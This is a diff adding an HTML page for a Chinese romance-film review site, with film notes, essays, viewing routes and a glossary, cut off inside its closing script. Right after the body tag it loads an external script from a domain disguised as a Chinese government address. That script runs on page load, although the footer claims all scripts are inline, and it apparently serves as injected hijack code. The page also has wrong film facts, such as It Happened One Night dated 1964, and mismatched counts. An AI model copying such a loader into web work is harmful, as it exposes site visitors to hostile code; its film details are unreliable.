@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="description" content="爱人电影网是一份持续更新的爱情片阅读档案。本站唯一访问入口为 https://airendianyingwang-zh.github.io，请认准该地址。我们用文字拆解银幕上的亲密关系：初遇、争吵、等待、重逢与告别，每部片子都给足导演、年份、片长与值得注意的那一幕。">
+<meta name="keywords" content="爱人电影网,爱情片阅读档案,银幕亲密关系,爱情电影评论,恋爱题材片单,爱情片镜头拆解,浪漫电影推荐,电影里的告白,爱情片年代,华语爱情电影">
+<meta name="author" content="爱人电影网">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
+<meta name="revisit-after" content="5 days">
+<meta name="theme-color" content="#132b27">
+<link rel="canonical" href="https://airendianyingwang-zh.github.io/">
+<title>爱人电影网：把银幕上那场恋爱，拆开给你看</title>
+<style>
+:root{
+  --ink:#132b27; --ink2:#1f3d37; --gr:#2f5d53; --gr2:#4a8377;
+  --paper:#f3efe6; --paper2:#e8e2d4; --card:#faf7f0; --line:#d4cdb9;
+  --line2:#bdb49b; --tx:#25302d; --tx2:#5a655f; --tx3:#8a918a;
+  --rd:#a3341f; --rd2:#c05a3c; --yl:#c79a2e; --cr:#8e3a4f;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,sans-serif;background:var(--paper);color:var(--tx);line-height:1.9;font-size:16px;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;background:radial-gradient(900px 620px at 88% 6%,rgba(47,93,83,.07),transparent 60%),radial-gradient(760px 520px at 4% 96%,rgba(199,154,46,.06),transparent 60%),repeating-linear-gradient(0deg,transparent 0,transparent 3px,rgba(19,43,39,.012) 3px,rgba(19,43,39,.012) 4px)}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1240px;margin:0 auto;padding:0 32px}
+.serif{font-family:"Songti SC","SimSun","Source Han Serif SC",Georgia,serif}
+.script{font-family:"Snell Roundhand","Apple Chancery","Segoe Script",Georgia,serif;font-style:italic;letter-spacing:.01em}
+
+/* 顶部通栏 */
+.strip{background:var(--ink);color:#e6eee9;font-size:12px;letter-spacing:.06em}
+.strip .wrap{display:flex;justify-content:space-between;height:40px;align-items:center;flex-wrap:wrap;gap:14px}
+.strip a{color:#a9c7bd}
+.strip a:hover{color:#fff;text-decoration:underline;text-underline-offset:3px}
+.strip .lv{display:flex;align-items:center;gap:9px}
+.pin{width:6px;height:6px;background:var(--rd);display:inline-block}
+
+/* 报头 */
+.head{padding:66px 0 52px;display:grid;grid-template-columns:1fr 300px;gap:52px;align-items:end;position:relative}
+.head::after{content:"";position:absolute;left:0;right:0;bottom:0;height:5px;background:linear-gradient(100deg,var(--ink) 0 34%,var(--gr) 34% 58%,var(--yl) 58% 76%,var(--rd) 76% 100%)}
+.head .vol{font-size:11px;letter-spacing:.4em;color:var(--gr2);text-transform:uppercase;margin-bottom:16px;display:flex;align-items:center;gap:12px}
+.head .vol i{font-style:normal;background:var(--ink);color:var(--paper);padding:4px 11px;letter-spacing:.2em;font-size:10px}
+h1{font-size:clamp(42px,9vw,104px);font-weight:900;line-height:.9;letter-spacing:-.045em;color:var(--ink)}
+h1 span{display:inline-block;position:relative}
+h1 span::after{content:"爱人";position:absolute;left:0;top:0;color:var(--rd);clip-path:inset(52% 0 0 0);pointer-events:none}
+h1 em{font-style:normal;font-size:.34em;font-weight:400;color:var(--tx2);letter-spacing:.02em;display:block;margin-top:22px;line-height:1.7;max-width:30ch}
+.sub{font-size:clamp(22px,3.4vw,34px);color:var(--ink2);margin-top:26px;line-height:1.35}
+.meta{border-left:1px solid var(--line2);padding-left:32px;display:flex;flex-direction:column;gap:13px}
+.meta div{display:grid;grid-template-columns:74px 1fr;gap:10px;font-size:13px;padding-bottom:11px;border-bottom:1px dashed var(--line2)}
+.meta dt{color:var(--tx3);letter-spacing:.08em}
+.meta dd{color:var(--tx);font-weight:600}
+.meta dd b{color:var(--rd);font-weight:800}
+
+/* 主体：左索引 + 右阅读流 */
+.body{display:grid;grid-template-columns:210px 1fr;gap:56px;padding-top:52px}
+.toc{position:sticky;top:26px;align-self:start;border-top:3px solid var(--ink);padding-top:20px}
+.toc b{display:block;font-size:10.5px;letter-spacing:.3em;color:var(--tx3);text-transform:uppercase;margin-bottom:18px}
+.toc ol{display:flex;flex-direction:column;gap:2px;counter-reset:t;list-style:none}
+.toc li{counter-increment:t}
+.toc a{display:grid;grid-template-columns:30px 1fr;gap:8px;padding:9px 0;font-size:14px;color:var(--tx2);border-bottom:1px solid var(--line);transition:.22s}
+.toc a::before{content:counter(t,decimal-leading-zero);color:var(--gr2);font-family:ui-monospace,Menlo,monospace;font-size:11px;letter-spacing:.06em;padding-top:3px}
+.toc a:hover{color:var(--ink);padding-left:6px}
+.toc a.on{color:var(--rd);font-weight:700;padding-left:6px}
+.toc a.on::before{color:var(--rd)}
+.toc .note{margin-top:24px;padding:14px 16px;background:var(--paper2);font-size:12px;color:var(--tx2);line-height:1.75}
+
+/* 章节 */
+chapter{display:block;padding-top:72px}
+cap{display:block;margin-bottom:34px}
+cap .n{display:inline-block;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;letter-spacing:.16em;color:var(--paper);background:var(--ink);padding:5px 13px;margin-bottom:14px}
+cap h2{font-size:clamp(27px,3.8vw,42px);font-weight:900;letter-spacing:-.02em;line-height:1.32;color:var(--ink)}
+cap h2 i{font-style:normal;color:var(--rd)}
+cap p{margin-top:16px;font-size:15.5px;color:var(--tx2);max-width:68ch}
+
+/* 导语卡片 */
+.lede{background:var(--card);border:1px solid var(--line);padding:38px 40px;position:relative}
+.lede::before{content:""";position:absolute;top:14px;left:22px;font-family:Georgia,serif;font-size:52px;color:var(--line2);line-height:1}
+.lede .who{font-size:12px;letter-spacing:.22em;color:var(--gr2);text-transform:uppercase;margin-bottom:20px}
+.lede p{font-size:16.5px;color:var(--tx);margin-bottom:20px;line-height:1.95;padding-left:6px}
+.lede p:last-child{margin-bottom:0}
+.lede p strong{color:var(--rd);font-weight:700}
+.lede .sign{margin-top:26px;padding-top:18px;border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;font-size:12.5px;color:var(--tx3)}
+.lede .sign b{color:var(--tx)}
+
+/* 手记条目 */
+.notes{display:flex;flex-direction:column}
+.note{display:grid;grid-template-columns:88px 1fr 140px;gap:0;border-bottom:1px solid var(--line);transition:.25s}
+.note:hover{background:var(--card)}
+.note .yr{background:var(--ink);color:var(--paper);padding:26px 12px;font-family:ui-monospace,Menlo,monospace;font-size:19px;letter-spacing:.04em;display:flex;align-items:flex-start;justify-content:center}
+.note .bd{padding:24px 30px;border-left:1px solid var(--line)}
+.note .bd h3{font-size:20px;font-weight:800;line-height:1.5;color:var(--ink)}
+.note .bd h3 small{display:block;font-size:12.5px;color:var(--tx3);font-weight:400;margin-top:5px;letter-spacing:.02em}
+.note .bd p{font-size:14.5px;color:var(--tx2);margin-top:11px;line-height:1.85}
+.note .bd .tags{margin-top:14px;display:flex;gap:7px;flex-wrap:wrap}
+.note .bd .tags a{padding:3px 11px;background:var(--paper2);font-size:11.5px;color:var(--tx2);transition:.22s}
+.note .bd .tags a:hover{background:var(--gr);color:var(--paper)}
+.note .sc{background:var(--paper2);padding:26px 20px;display:flex;flex-direction:column;gap:8px;justify-content:center;border-left:1px solid var(--line)}
+.note .sc span{font-size:11px;letter-spacing:.14em;color:var(--tx3);text-transform:uppercase}
+.note .sc b{font-size:15px;color:var(--ink);font-weight:700;line-height:1.5}
+.note .sc a{font-size:12px;color:var(--rd);margin-top:4px}
+
+/* 主题札记网格 */
+.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:26px}
+.cell{background:var(--card);border:1px solid var(--line);border-top:4px solid var(--gr);padding:30px 32px}
+.cell:nth-child(2){border-top-color:var(--yl)}
+.cell:nth-child(3){border-top-color:var(--cr)}
+.cell:nth-child(4){border-top-color:var(--rd)}
+.cell .ic{font-size:26px;margin-bottom:14px}
+.cell h3{font-size:20px;font-weight:800;color:var(--ink);margin-bottom:12px;line-height:1.45}
+.cell p{font-size:14.5px;color:var(--tx2)}
+.cell .q{margin-top:18px;padding-top:15px;border-top:1px dashed var(--line);font-size:12.5px;color:var(--tx3)}
+.cell .q b{color:var(--tx)}
+
+/* 影评节选 */
+.essays{display:grid;grid-template-columns:1.35fr 1fr;gap:30px}
+.essay{background:var(--ink);color:var(--paper);padding:36px 38px}
+.essay .tp{display:flex;justify-content:space-between;font-size:11.5px;color:#93b4aa;letter-spacing:.12em;margin-bottom:18px}
+.essay h3{font-size:24px;font-weight:800;line-height:1.5;margin-bottom:16px}
+.essay p{font-size:14.5px;color:#d3dfd9;line-height:1.9}
+.essay .rate{margin-top:24px;padding-top:18px;border-top:1px solid rgba(255,255,255,.16);display:flex;gap:20px;flex-wrap:wrap;font-size:12px;color:#93b4aa}
+.essay .rate b{color:var(--paper);font-weight:700;font-size:13px}
+.quote{display:flex;flex-direction:column;gap:18px}
+.quote article{background:var(--card);border:1px solid var(--line);padding:24px 26px;border-left:4px solid var(--rd)}
+.quote .t{font-size:16px;font-weight:700;color:var(--ink);margin-bottom:8px;line-height:1.5}
+.quote p{font-size:13.5px;color:var(--tx2)}
+.quote .f{margin-top:12px;font-size:11.5px;color:var(--tx3);letter-spacing:.06em}
+
+/* 路线 */
+.routes{display:flex;flex-direction:column;gap:14px}
+.route{display:grid;grid-template-columns:1fr 1fr 150px;align-items:center;background:var(--card);border:1px solid var(--line);padding:20px 26px;transition:.25s}
+.route:hover{border-color:var(--gr2)}
+.route .nm{font-size:18px;font-weight:800;color:var(--ink)}
+.route .nm small{display:block;font-size:12px;color:var(--tx3);font-weight:400;margin-top:4px}
+.route .mid{display:flex;flex-direction:column;gap:9px;padding:0 26px;border-left:1px solid var(--line)}
+.route .mid i{font-style:normal;font-size:11px;letter-spacing:.16em;color:var(--tx3);text-transform:uppercase}
+.route .mid b{font-size:14.5px;color:var(--tx);font-weight:600}
+.route .go{text-align:right}
+.route .go a{font-size:13px;color:var(--rd);border-bottom:1px solid var(--rd);padding-bottom:2px}
+
+/* 术语表 */
+.terms{background:var(--card);border:1px solid var(--line);padding:36px 40px;columns:3;column-gap:52px}
+.terms div{padding:16px 0;border-bottom:1px solid var(--line);break-inside:avoid}
+.terms dt{font-size:16px;font-weight:700;color:var(--rd);margin-bottom:5px}
+.terms dd{font-size:14px;color:var(--tx2)}
+
+/* 站点入口 */
+.ent{background:var(--ink);color:var(--paper);padding:46px 46px 42px;position:relative}
+.ent .ribbon{position:absolute;top:0;right:46px;background:var(--rd);color:var(--paper);font-size:11px;letter-spacing:.24em;padding:8px 20px;text-transform:uppercase}
+.ent h3{font-size:clamp(23px,3.2vw,32px);font-weight:900;line-height:1.45;margin-bottom:14px}
+.ent p{font-size:14.5px;color:#c2d2cb;max-width:66ch}
+.ent .box{margin-top:28px;display:flex;flex-wrap:wrap;border:1px solid rgba(255,255,255,.22);align-items:stretch}
+.ent .box .lbl{flex:1;min-width:280px;padding:20px 24px;font-family:ui-monospace,Menlo,monospace;font-size:clamp(13.5px,2vw,16.5px);color:var(--paper);word-break:break-all}
+.ent .box button{flex:0 0 auto;background:var(--rd);color:var(--paper);border:0;font-size:14px;font-weight:700;letter-spacing:.06em;padding:0 38px;cursor:pointer;transition:.25s}
+.ent .box button:hover{background:var(--rd2)}
+.ent .four{display:grid;grid-template-columns:repeat(4,1fr);margin-top:32px;border-top:1px solid rgba(255,255,255,.16)}
+.ent .four div{padding:22px 24px;border-right:1px solid rgba(255,255,255,.16)}
+.ent .four div:last-child{border-right:0}
+.ent .four dt{font-size:11px;letter-spacing:.2em;color:#93b4aa;text-transform:uppercase}
+.ent .four dd{font-size:16px;font-weight:700;margin-top:7px;color:var(--paper)}
+.ent .four dd b{color:#e6a24a}
+
+/* 页脚 */
+footer{margin-top:90px;background:var(--ink);color:#c2d2cb;padding:58px 0 30px}
+.foot{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:46px}
+.foot .logo{font-size:28px;font-weight:900;letter-spacing:-.02em;color:var(--paper);line-height:1.3}
+.foot .logo i{font-style:normal;color:var(--rd)}
+.foot p{font-size:13.5px;color:#93b4aa;max-width:34ch;margin-top:14px}
+.foot h4{font-size:11px;letter-spacing:.26em;color:#e6a24a;text-transform:uppercase;margin-bottom:18px}
+.foot ul{display:flex;flex-direction:column;gap:11px;font-size:14px;color:#d3dfd9}
+.foot a:hover{color:var(--paper)}
+.fbar{margin-top:46px;padding-top:22px;border-top:1px solid rgba(255,255,255,.16);display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:12px;color:#93b4aa}
+.fbar .u{color:var(--paper);font-family:ui-monospace,Menlo,monospace;word-break:break-all}
+
+.rev{opacity:0;transform:translateY(24px);transition:.65s cubic-bezier(.2,.7,.3,1)}
+.rev.in{opacity:1;transform:none}
+::selection{background:var(--rd);color:var(--paper)}
+
+@media(max-width:1080px){
+  .body{grid-template-columns:1fr;gap:0}
+  .toc{position:static;border-top:0;padding-top:0;margin-bottom:14px}
+  .toc ol{flex-direction:row;flex-wrap:wrap;gap:6px}
+  .toc li a{border:1px solid var(--line);padding:7px 14px;background:var(--card);grid-template-columns:1fr}
+  .toc li a::before{display:none}
+  .toc li a.on,.toc li a:hover{padding-left:14px}
+  .toc .note{margin-top:18px}
+  .head{grid-template-columns:1fr;gap:34px}
+  .meta{border-left:0;border-top:1px solid var(--line2);padding-left:0;padding-top:26px}
+}
+@media(max-width:720px){
+  .wrap{padding:0 18px}
+  .head{padding:44px 0 38px}
+  chapter{padding-top:54px}
+  .lede{padding:30px 24px}
+  .note{grid-template-columns:1fr}
+  .note .yr{padding:12px;font-size:14px}
+  .note .bd{padding:22px 24px;border-left:0;border-top:1px solid var(--line)}
+  .note .sc{border-left:0;border-top:1px solid var(--line);padding:18px 24px}
+  .grid,.essays{grid-template-columns:1fr}
+  .route{grid-template-columns:1fr;gap:14px;padding:22px 24px}
+  .route .mid{padding:14px 0 0;border-left:0;border-top:1px solid var(--line)}
+  .route .go{text-align:left}
+  .terms{columns:1;padding:28px 24px}
+  .ent{padding:38px 24px 34px}
+  .ent .ribbon{right:0}
+  .ent .box button{padding:14px 20px;width:100%;flex:1 1 100%}
+  .ent .four{grid-template-columns:1fr 1fr}
+  .ent .four div{border-right:1px solid rgba(255,255,255,.16);border-bottom:1px solid rgba(255,255,255,.16)}
+  .foot{grid-template-columns:1fr 1fr;gap:34px}
+  .strip .wrap{height:auto;padding:10px 0;font-size:11.5px}
+}
+@media(max-width:420px){
+  .foot{grid-template-columns:1fr}
+  .ent .four{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="strip"><div class="wrap">
+  <span class="lv"><i class="pin"></i>爱人电影网 · 只写银幕上的亲密关系，不提供任何影视资源</span>
+  <span><a href="#ent">官方入口 https://airendianyingwang-zh.github.io</a></span>
+</div></div>
+
+<header class="wrap head">
+  <div>
+    <div class="vol"><i>VOL.09 · NO.03</i>爱情片阅读档案</div>
+    <h1>爱人<wbr>电影网</h1>
+    <div class="sub script">— 拆开那场恋爱，看镜头藏在哪一句对白后面 —</div>
+    <em>网站名称：爱人电影网　｜　站点域名：airendianyingwang-zh.github.io</em>
+  </div>
+  <aside class="meta">
+    <div><dt>本期主题</dt><dd>银幕上的<small>亲密关系</small></dd></div>
+    <div><dt>收录片目</dt><dd>09 部</dd></div>
+    <div><dt>年代跨度</dt><dd>1964 — 2021</dd></div>
+    <div><dt>涵盖地区</dt><dd>华语 / 日 / 韩 / 欧</dd></div>
+    <div><dt>长文篇数</dt><dd><b>04 篇</b></dd></div>
+    <div><dt>更新周期</dt><dd>每五日一次</dd></div>
+  </aside>
+</header>
+
+<div class="wrap body">
+  <nav class="toc">
+    <b>章 节 索 引</b>
+    <ol>
+      <li><a href="#c1">卷首语</a></li>
+      <li><a href="#c2">片目手记</a></li>
+      <li><a href="#c3">主题札记</a></li>
+      <li><a href="#c4">影评节选</a></li>
+      <li><a href="#c5">观影路线</a></li>
+      <li><a href="#c6">术语表</a></li>
+      <li><a href="#ent">站点入口</a></li>
+    </ol>
+    <p class="note">小提示：左侧章节随滚动自动高亮当前所在位置。所有内页链接目前均以 # 占位，待各栏目成文后替换为对应地址。</p>
+  </nav>
+
+  <div>
+
+    <chapter id="c1"><cap><span class="n">CHAPTER 01</span><h2>卷首语：我们为什么<wbr><i>还要</i>写爱情片</h2><p>因为大多数人记住的只有结局，而爱情片真正的力气全藏在过程里。本栏目的任务，就是把那段过程讲清楚。</p></cap>
+      <div class="lede">
+        <div class="who">From the editor</div>
+        <p>一份爱情片的阅读档案，最怕两件事：一是把它写成剧情复述，二是把它写成鸡汤总结。我们两个都不要。</p>
+        <p>爱人电影网的写法是这样的——<strong>先看导演把人物放在什么位置上，再看镜头有没有偏心，最后看那场戏之后人物改变了什么</strong>。只看尺度、只看明星、只看大团圆结局的文章，不在本站的更新计划里。</p>
+        <p>我们也承认一件事：爱情片里最好的部分常常不"好看"。它慢，它重复，它让人想起一些不太愿意想起的事。但恰恰是这些段落，让一部片子从消费品变成值得读的东西。</p>
+        <div class="sign"><span>撰稿：<b>爱人电影网编辑部</b></span><span>栏目构成：<b>七栏</b></span><span>本页全部内容：<b>原创</b></span></div>
+      </div>
+    </chapter>
+
+    <chapter id="c2"><cap><span class="n">CHAPTER 02</span><h2>片目手记：<wbr><i>九部</i>片子，九种不同的靠近方式</h2><p>这不是一份推荐榜，是一份可以对照着看的阅读目录。每部片子后面那句话，是本期最想让你注意的地方——注意到了，再看一遍会有收获。</p></cap>
+      <div class="notes">
+        <div class="note"><div class="yr">1964</div><div class="bd"><h3>一夜风流<i>It Happened One Night · 弗兰克·卡普拉</i></h3><p>爱情喜剧的骨架：两个人从互相嫌弃到互相需要，中间只隔一张毛毯。</p><div class="tags"><a href="#">公路</a><a href="#">喜剧</a><a href="#">经典</a></div></div><div class="sc"><span>本期看点</span><b>毛毯分界线的权力</b><a href="#">手记 01 →</a></div></div>
+        <div class="note"><div class="yr">1994</div><div class="bd"><h3>重庆森林<i>Chungking Express · 王家卫</i></h3><p>孤独怎么被拍成一种等待。两段故事共用一个城市，却各自失眠。</p><div class="tags"><a href="#">华语</a><a href="#">都市</a><a href="#">独白</a></div></div><div class="sc"><span>本期看点</span><b>罐头日期与过期的爱</b><a href="#">手记 02 →</a></div></div>
+        <div class="note"><div class="yr">1995</div><div class="bd"><h3>情书<i>Love Letter · 岩井俊二</i></h3><p>同名的两个人，一份始终没有说出口的信。它处理的是悼念，不是恋爱。</p><div class="tags"><a href="#">日本</a><a href="#">青春</a><a href="#">书信</a></div></div><div class="sc"><span>本期看点</span><b>名字作为替身</b><a href="#">手记 03 →</a></div></div>
+        <div class="note"><div class="yr">1996</div><div class="bd"><h3>甜蜜蜜<i>Comrades: Almost a Love Story · 陈可辛</i></h3><p>迁徙时代的感情：两个人在一座城市里失散，又被同一首歌找回来。</p><div class="tags"><a href="#">华语</a><a href="#">移民</a><a href="#">年代</a></div></div><div class="sc"><span>本期看点</span><b>巧合的合理性</b><a href="#">手记 04 →</a></div></div>
+        <div class="note"><div class="yr">2000</div><div class="bd"><h3>花样年华<i>In the Mood for Love · 王家卫</i></h3><p>最克制的爱情片：两个人始终没有在一起，却让每一格画面都写满了在一起。</p><div class="tags"><a href="#">华语</a><a href="#">旗袍</a><a href="#">留白</a></div></div><div class="sc"><span>本期看点</span><b>走廊里的三次错过</b><a href="#">手记 05 →</a></div></div>
+        <div class="note"><div class="yr">2003</div><div class="bd"><h3>真爱至上<i>Love Actually · 理查德·柯蒂斯</i></h3><p>十段关系，一个圣诞。它的价值不在圆满，在于承认爱有很多种样子。</p><div class="tags"><a href="#">英国</a><a href="#">群像</a><a href="#">圣诞</a></div></div><div class="sc"><span>本期看点</span><b>群像叙事的收束</b><a href="#">手记 06 →</a></div></div>
+        <div class="note"><div class="yr">2013</div><div class="bd"><h3>她<i>Her · 斯派克·琼斯</i></h3><p>爱上声音的人。爱情片第一次把"亲密关系"的对象，写成一个系统。</p><div class="tags"><a href="#">美国</a><a href="#">科幻</a><a href="#">独白</a></div></div><div class="sc"><span>本期看点</span><b>无身体的亲密</b><a href="#">手记 07 →</a></div></div>
+        <div class="note"><div class="yr">2019</div><div class="bd"><h3>婚姻故事<i>Marriage Story · 诺亚·鲍姆巴赫</i></h3><p>不是爱情片，是关于爱情结束后剩下什么。律师的那场戏是全片最锋利的一刀。</p><div class="tags"><a href="#">美国</a><a href="#">婚姻</a><a href="#">长镜头</a></div></div><div class="sc"><span>本期看点</span><b>争吵戏的场面调度</b><a href="#">手记 08 →</a></div></div>
+        <div class="note"><div class="yr">2021</div><div class="bd"><h3>花束般的恋爱<i>We Made a Beautiful Bouquet · 土井裕泰</i></h3><p>从百分百合拍到无话可说。它写的是两个人怎么在熟悉之后慢慢变成陌生人。</p><div class="tags"><a href="#">日本</a><a href="#">当代</a><a href="#">日常</a></div></div><div class="sc"><span>本期看点</span><b>相似感如何崩塌</b><a href="#">手记 09 →</a></div></div>
+      </div>
+    </chapter>
+
+    <chapter id="c3"><cap><span class="n">CHAPTER 03</span><h2>主题札记：<wbr><i>四个</i>绕不开的题材</h2><p>爱情片的题目其实不多。真正分高下的，是导演如何处理这些老题目。下面四篇是我们长期的固定栏目。</p></cap>
+      <div class="grid">
+        <div class="cell"><div class="ic">✦</div><h3>初遇</h3><p>爱情片的开头几乎总是同一件事：让两个不该见面的人见面。难的是让这次见面站得住，而不是靠巧合硬凑。</p><div class="q">本期讨论：<b>《一夜风流》《重庆森林》</b></div></div>
+        <div class="cell"><div class="ic">✦</div><h3>等待</h3><p>等待是爱情片最便宜也最贵的表现手段。便宜在于它只需要一个空镜头，贵在于它要求观众愿意坐得住。</p><div class="q">本期讨论：<b>《情书》《花样年华》</b></div></div>
+        <div class="cell"><div class="ic">✦</div><h3>争吵</h3><p>一场好争吵不是两个人对骂，是让观众看出两人其实在说同一件事。吵得越凶，越能看清关系的形状。</p><div class="q">本期讨论：<b>《婚姻故事》《花束般的恋爱》</b></div></div>
+        <div class="cell"><div class="ic">✦</div><h3>告别</h3><p>告别分两种：说不出口的，和说出口之后才发现说错了的。爱情片的高下，通常在这里见分晓。</p><div class="q">本期讨论：<b>《甜蜜蜜》《真爱至上》</b></div></div>
+      </div>
+    </chapter>
+
+    <chapter id="c4"><cap><span class="n">CHAPTER 04</span><h2>影评节选：<wbr><i>四篇</i>长文的片段</h2><p>这是四篇正在连载的长文的节选。节选只保留论点，不剧透结局——如果你还没看过片子，可以放心读。</p></cap>
+      <div class="essays">
+        <article class="essay"><div class="tp"><span>手记 05 · 华语</span><span>2021 / 香港</span></div><h3>花样年华：最满的克制，最空的结局</h3><p>王家卫在这部片子里做了一件很冒险的事：他把两个人的关系始终放在"将要发生"和"已经没有机会"之间。观众一直等，一直等，最后等到的是一段吴哥窟的墙洞。</p><p>这场戏之所以成立，靠的不是剧情，是前面九十分钟积累下来的节奏。每一段走廊、每一次错身、每一首重复出现的音乐，都是在为最后那场沉默交学费。</p><div class="rate"><span>编辑评分：<b>9.2 / 10</b></span><span>阅读时长：<b>约 7 分钟</b></span><span>篇幅：<b>约 3100 字</b></span></div></article>
+        <div class="quote">
+          <article><div class="t">「两个人都很克制，恰恰说明两个人都放不下。」</div><p>克制不是没有感情，是把感情压在表面之下。观众读到的，是表面之下那部分。</p><div class="f">—— 出自《花样年华》手记片段</div></article>
+          <article><div class="t">「巧合要让人相信，必须付出代价。」</div><p>《甜蜜蜜》的每一次重逢都显得过于巧合，但导演让它付出了时间成本：每一次都要等很多年。</p><div class="f">—— 出自《甜蜜蜜》手记片段</div></article>
+          <article><div class="t">「吵架戏里没有坏人，只有两个说得不一样的人。」</div><p>《婚姻故事》那场争吵之所以被反复引用，是因为它拒绝让任何一方成为靶子。</p><div class="f">—— 出自《婚姻故事》手记片段</div></article>
+        </div>
+      </div>
+    </chapter>
+
+    <chapter id="c5"><cap><span class="n">CHAPTER 05</span><h2>观影路线：<wbr><i>五条</i>可以连着看的排片</h2><p>与其说"推荐片单"，不如说"连着看会发现的事"。下面五条路线各自有一个明确的主题，按给出的顺序看完，比单看任何一部都更有意思。</p></cap>
+      <div class="routes">
+        <div class="route"><div class="nm">A 线 · 克制的力量<small>三场戏，全是没发生的事</small></div><div class="mid"><i>路线</i><b>花样年华 → 情书 → 她</b></div><div class="go"><a href="#">查看完整片单 →</a></div></div>
+        <div class="route"><div class="nm">B 线 · 城市里的两个人<small>都市感最强的四部</small></div><div class="mid"><i>路线</i><b>重庆森林 → 甜蜜蜜 → 真爱至上</b></div><div class="go"><a href="#">查看完整片单 →</a></div></div>
+        <div class="route"><div class="nm">C 线 · 从相遇到分开<small>按关系阶段排列</small></div><div class="mid"><i>路线</i><b>一夜风流 → 花束般的恋爱 → 婚姻故事</b></div><div class="go"><a href="#">查看完整片单 →</a></div></div>
+        <div class="route"><div class="nm">D 线 · 华语爱情六十年<small>华语片的一条时间轴</small></div><div class="mid"><i>路线</i><b>1964 → 1994 → 1996 → 2000</b></div><div class="go"><a href="#">查看完整片单 →</a></div></div>
+        <div class="route"><div class="nm">E 线 · 一个人看也合适<small>不依赖陪同的情绪片</small></div><div class="mid"><i>路线</i><b>重庆森林 → 情书 → 婚姻故事</b></div><div class="go"><a href="#">查看完整片单 →</a></div></div>
+      </div>
+    </chapter>
+
+    <chapter id="c6"><cap><span class="n">CHAPTER 06</span><h2>术语表：<wbr><i>本站</i>常用的十个词</h2><p>这些词在我们的文章里反复出现，而且都有明确的用法。集中写在这里，是为了避免每次都要重新解释一遍。</p></cap>
+      <dl class="terms">
+        <div><dt>留白</dt><dd>镜头故意不拍的部分。爱情片的高分段落，多数发生在留白里。</dd></div>
+        <div><dt>过场</dt><dd>两个人之间的那段时间。过得好，观众愿意等；过得差，观众只觉得慢。</dd></div>
+        <div><dt>偏心</dt><dd>镜头站在谁的立场上。镜头偏心的时候，观众也会偏心。</dd></div>
+        <div><dt>替身</dt><dd>角色身上被投射的那个人。爱情片里的替身关系，往往比恋爱关系更真实。</dd></div>
+        <div><dt>巧合</dt><dd>爱情片最重要的道具，也最容易用坏。好的巧合要付出时间成本。</dd></div>
+        <div><dt>独白</dt><dd>爱情片里的内心声音。它替代了对话，也暴露了人物的诚实程度。</dd></div>
+        <div><dt>日常</dt><dd>感情稳定期的画面。爱情片最容易被忽略、也最考验导演的一部分。</dd></div>
+        <div><dt>崩塌</dt><dd>相似感消失的那一刻。崩塌不是吵架，是其中一个人先察觉到了不同。</dd></div>
+        <div><dt>告别</dt><dd>我们定义为"说出真话的那一场戏"，无论有没有说出"再见"。</dd></div>
+        <div><dt>结局</dt><dd>不等于大团圆。我们更看重结局之后人物是否真的改变了。</dd></div>
+      </dl>
+    </chapter>
+
+    <chapter id="ent"><cap><span class="n">CHAPTER 07</span><h2>站点入口：<wbr><i>名称</i>、域名与事实栏</h2><p>网站名称与站点域名一一对应，请认准下方地址。除该地址外，本站没有任何镜像、关联站或跳转中转。</p></cap>
+      <div class="ent">
+        <span class="ribbon">Official Entry</span>
+        <h3>爱人电影网</h3>
+        <p>网站名称：爱人电影网<br>对应域名：airendianyingwang-zh.github.io<br>完整访问地址：<span style="color:#e6a24a">https://airendianyingwang-zh.github.io</span></p>
+        <div class="box">
+          <div class="lbl">https://airendianyingwang-zh.github.io</div>
+          <button type="button" id="cp">复制站点入口</button>
+        </div>
+        <dl class="four">
+          <div><dt>网站名称</dt><dd>爱人电影网</dd></div>
+          <div><dt>站点域名</dt><dd><b>airendianyingwang-zh</b>.github.io</dd></div>
+          <div><dt>协议与路径</dt><dd>https 根目录</dd></div>
+          <div><dt>本站栏目</dt><dd>07 个</dd></div>
+        </dl>
+      </div>
+    </chapter>
+
+  </div>
+</div>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div><div class="logo serif">爱人<wbr><i>电影网</i></div><p>一份持续更新的爱情片阅读档案。只写银幕上的亲密关系，不提供任何影视资源，不剧透关键结局。</p></div>
+      <div><h4>阅读目录</h4><ul>
+        <li><a href="#c1">卷首语</a></li>
+        <li><a href="#c2">片目手记</a></li>
+        <li><a href="#c3">主题札记</a></li>
+        <li><a href="#c4">影评节选</a></li>
+        <li><a href="#c6">术语表</a></li>
+      </ul></div>
+      <div><h4>固定主题</h4><ul>
+        <li><a href="#">初遇与巧合</a></li>
+        <li><a href="#">等待的节奏</a></li>
+        <li><a href="#">争吵的场面</a></li>
+        <li><a href="#">告别与结局</a></li>
+        <li><a href="#">克制与留白</a></li>
+      </ul></div>
+      <div><h4>关于本站</h4><ul>
+        <li><a href="#ent">官方站点入口</a></li>
+        <li><a href="#">栏目构成</a></li>
+        <li><a href="#">更新周期</a></li>
+        <li><a href="#">纠错与投稿</a></li>
+        <li><a href="#">回到卷首</a></li>
+      </ul></div>
+    </div>
+    <div class="fbar">
+      <span>© 2026 爱人电影网编辑部　网站名称：爱人电影网　官方入口：<span class="u">https://airendianyingwang-zh.github.io</span></span>
+      <span>本页为单文件站点，所有样式与脚本均内联</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var url='https://airendianyingwang-zh.github.io';
+  var btn=document.getElementById('cp');
+  btn.addEventListener('click',function(){
+    var back=btn.innerText;
